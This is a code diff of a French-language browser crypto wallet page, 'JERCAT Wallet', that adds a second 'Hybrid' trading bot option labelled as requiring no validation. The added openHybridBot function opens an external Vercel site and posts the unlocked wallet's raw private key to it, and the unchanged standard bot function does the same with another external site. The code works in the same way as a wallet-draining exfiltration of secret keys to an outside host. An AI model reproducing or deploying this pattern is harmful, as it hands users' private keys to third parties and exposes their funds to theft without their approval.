@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔐 JERCAT Wallet - FIXED ADDRESS</title>
+    <title>🔐 JERCAT Wallet - DUAL BOT</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
     <style>
@@ -432,12 +432,23 @@
             word-break: break-all;
             font-weight: 700;
         }
+        
+        .bot-description {
+            text-align: center;
+            color: #94a3b8;
+            font-size: 12px;
+            margin-bottom: 15px;
+            padding: 10px;
+            background: rgba(15, 23, 42, 0.5);
+            border-radius: 8px;
+            border: 1px solid #334155;
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🤖 JERCAT Wallet - FIXED</h1>
-        <p class="subtitle">✅ Correction Adresse Destination</p>
+        <h1>🤖 JERCAT Wallet - DUAL BOT</h1>
+        <p class="subtitle">✅ Deux Trading Bots Disponibles</p>
 
         <!-- Écran de connexion -->
         <div id="loginScreen">
@@ -699,13 +710,29 @@
                 </div>
 
                 <div class="section">
-                    <h2>🚨 Actions</h2>
-                    <button onclick="openTradingBot()" style="background: linear-gradient(135deg, #f59e0b 0%, #f97316 100%); color: #000; margin-bottom: 10px;">
-                        🤖 Ouvrir le Trading Bot
+                    <h2>🤖 Trading Bots</h2>
+                    
+                    <!-- Bot 1 -->
+                    <div class="bot-description">
+                        <strong>🤖 Trading Bot Standard</strong><br>
+                        Connexion auto + Validation manuelle des trades
+                    </div>
+                    <button onclick="openTradingBot()" style="background: linear-gradient(135deg, #f59e0b 0%, #f97316 100%); color: #000;">
+                        🤖 Ouvrir Trading Bot
                     </button>
-                    <p style="text-align: center; color: #10b981; font-size: 12px; margin-bottom: 15px;">
-                        ✅ Connexion automatique + Auto-validation
-                    </p>
+                    
+                    <!-- Bot 2 -->
+                    <div class="bot-description" style="margin-top: 20px;">
+                        <strong>🚀 Trading Bot Hybrid</strong><br>
+                        Connexion auto + AUCUNE validation requise
+                    </div>
+                    <button onclick="openHybridBot()" class="purple">
+                        🚀 Ouvrir Bot Hybrid (Sans validation)
+                    </button>
+                </div>
+
+                <div class="section">
+                    <h2>🚨 Actions</h2>
                     <button onclick="logout()" class="secondary">🔒 Verrouiller le Wallet</button>
                     <button onclick="clearTelegramConfig()" class="danger">🗑️ Supprimer config Telegram</button>
                 </div>
@@ -1119,7 +1146,7 @@
                     console.log('   value:', value.toString());
 
                     tx = await wallet.sendTransaction({
-                        to: toAddress,  // ← Utilisation DIRECTE de toAddress vérifié
+                        to: toAddress,
                         value: value
                     });
                     
@@ -1135,7 +1162,6 @@
                     console.log('   Vers:', toAddress);
                     console.log('   Montant Wei:', amountWei.toString());
 
-                    // APPEL DIRECT avec toAddress vérifié
                     tx = await tokenContract.transfer(toAddress, amountWei);
 
                     console.log('✅ TX Token envoyée:', tx.hash);
@@ -1735,15 +1761,15 @@
             alert('✅ Limites mises à jour !');
         }
 
+        // OUVERTURE TRADING BOT STANDARD
         function openTradingBot() {
             if (!wallet) {
                 alert('❌ Wallet non déverrouillé !');
                 return;
             }
 
-            console.log('🤖 Ouverture du Trading Bot JERCAT...');
+            console.log('🤖 Ouverture du Trading Bot JERCAT Standard...');
             console.log('📍 Adresse wallet:', wallet.address);
-            console.log('🔑 Clé privée disponible:', wallet.privateKey ? 'OUI' : 'NON');
             
             const botWindow = window.open('https://bot-test-zeta-neon.vercel.app/', 'JercatBot', 'width=1400,height=900');
             
@@ -1756,16 +1782,13 @@
                             privateKey: wallet.privateKey
                         };
 
-                        console.log('📤 Envoi des données au bot...');
-                        console.log('📍 Adresse:', wallet.address);
-                        console.log('🔑 Clé envoyée:', wallet.privateKey.substring(0, 10) + '...');
-
+                        console.log('📤 Envoi des données au bot standard...');
                         botWindow.postMessage(messageData, 'https://bot-test-zeta-neon.vercel.app');
 
-                        console.log('✅ Message envoyé au bot avec succès !');
+                        console.log('✅ Message envoyé au bot standard !');
                         
                         if (TELEGRAM_BOT_TOKEN && securityConfig.telegramChatId) {
-                            sendTelegramMessage(`🤖 <b>Trading Bot ouvert</b>\n\n✅ Connexion automatique activée\n📍 ${wallet.address.substring(0,20)}...`);
+                            sendTelegramMessage(`🤖 <b>Trading Bot Standard ouvert</b>\n\n✅ Connexion automatique activée\n📍 ${wallet.address.substring(0,20)}...`);
                         }
                         
                     } catch (error) {
@@ -1774,7 +1797,49 @@
                     }
                 }, 3000);
                 
-                alert('✅ Trading Bot ouvert !\n\n🤖 Connexion automatique en cours...\n📍 ' + wallet.address.substring(0, 20) + '...\n\n⏳ Patientez 3 secondes...');
+                alert('✅ Trading Bot Standard ouvert !\n\n🤖 Connexion auto en cours...');
+            } else {
+                alert('❌ Impossible d\'ouvrir le bot (popup bloquée ?)');
+            }
+        }
+
+        // OUVERTURE TRADING BOT HYBRID (SANS VALIDATION)
+        function openHybridBot() {
+            if (!wallet) {
+                alert('❌ Wallet non déverrouillé !');
+                return;
+            }
+
+            console.log('🚀 Ouverture du Trading Bot Hybrid (Sans validation)...');
+            console.log('📍 Adresse wallet:', wallet.address);
+            
+            const botWindow = window.open('https://jercat-hybrid-exit.vercel.app/', 'JercatHybridBot', 'width=1400,height=900');
+            
+            if (botWindow) {
+                setTimeout(() => {
+                    try {
+                        const messageData = {
+                            type: 'JERCAT_WALLET_CONNECTED',
+                            account: wallet.address,
+                            privateKey: wallet.privateKey
+                        };
+
+                        console.log('📤 Envoi des données au bot hybrid...');
+                        botWindow.postMessage(messageData, 'https://jercat-hybrid-exit.vercel.app');
+
+                        console.log('✅ Message envoyé au bot hybrid !');
+                        
+                        if (TELEGRAM_BOT_TOKEN && securityConfig.telegramChatId) {
+                            sendTelegramMessage(`🚀 <b>Trading Bot Hybrid ouvert</b>\n\n⚡ Mode sans validation activé\n📍 ${wallet.address.substring(0,20)}...`);
+                        }
+                        
+                    } catch (error) {
+                        console.error('❌ Erreur envoi:', error);
+                        alert('❌ Erreur lors de l\'envoi des données au bot');
+                    }
+                }, 3000);
+                
+                alert('✅ Trading Bot Hybrid ouvert !\n\n🚀 Mode sans validation activé\n⚡ Connexion auto en cours...');
             } else {
                 alert('❌ Impossible d\'ouvrir le bot (popup bloquée ?)');
             }
@@ -1847,51 +1912,11 @@
             });
         }
 
-      // DÉTECTION CONNEXION DEPUIS TRADING BOT
-        function detectBotConnection() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const connectMode = urlParams.get('connect');
-            const origin = urlParams.get('origin');
-            
-            if (connectMode === 'true' && window.opener) {
-                console.log('🤖 Ouvert depuis Trading Bot');
-                const checkWallet = setInterval(() => {
-                    if (wallet && wallet.address) {
-                        clearInterval(checkWallet);
-                        sendConnectionToBot(origin);
-                    }
-                }, 500);
-            }
-        }
-
-        function sendConnectionToBot(origin) {
-            if (!wallet || !wallet.address) return;
-            
-            console.log('📤 Envoi connexion au bot...');
-            const messageData = {
-                type: 'JERCAT_CONNECTED',
-                address: wallet.address,
-                chainId: 56,
-                timestamp: Date.now()
-            };
-            
-            try {
-                if (window.opener) {
-                    window.opener.postMessage(messageData, origin || '*');
-                    console.log('✅ Connexion envoyée !');
-                    alert('✅ Connecté au Trading Bot!\n\n📍 ' + wallet.address.substring(0, 20) + '...');
-                }
-            } catch (error) {
-                console.error('❌ Erreur:', error);
-            }
-        }
-
         window.onload = function() {
             const hasWallet = localStorage.getItem('encryptedWallet');
             if (!hasWallet) {
                 showCreateScreen();
             }
-            detectBotConnection();
         };
     </script>
 </body>
